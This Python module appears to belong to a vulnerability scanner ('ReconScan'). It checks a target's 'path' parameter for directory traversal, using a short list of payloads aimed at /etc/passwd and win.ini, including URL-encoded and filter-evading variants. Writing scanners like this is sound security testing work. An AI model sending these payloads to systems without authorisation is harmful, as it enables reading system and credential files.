"""
ReconScan Directory Traversal Scanner

Directory traversal vulnerability detection module.
"""

import urllib.parse

class DirectoryTraversalScanner:
    """Directory traversal vulnerability scanner."""
    
    def __init__(self):
        """Initialize directory traversal scanner."""
        self.payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        self.traversal_indicators = [
            'root:x:0:0:', '[fonts]', 'for 16-bit app support'
        ]
    
    async def scan(self, session, target, verbose=True):
        """Perform directory traversal vulnerability scan."""
        if verbose:
            print("  → Testing directory traversal...")
        
        vulnerabilities = []
        vulnerabilities_found = 0
        
        for payload in self.payloads:
            try:
                test_url = f"{target}?path={urllib.parse.quote(payload)}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    if any(indicator in content for indicator in self.traversal_indicators):
                        vulnerability = {
                            'type': 'Directory Traversal',
                            'severity': 'High',
                            'url': test_url,
                            'payload': payload,
                            'description': 'Directory traversal vulnerability detected'
                        }
                        vulnerabilities.append(vulnerability)
                        vulnerabilities_found += 1
                        if verbose:
                            print(f"     Directory traversal found: {payload}")
                        break
                        
            except Exception as e:
                if verbose:
                    print(f"    ! Error testing payload '{payload}': {str(e)}")
                continue
        
        if verbose and vulnerabilities_found == 0:
            print("    ✓ No directory traversal vulnerabilities detected")
        
        return vulnerabilities 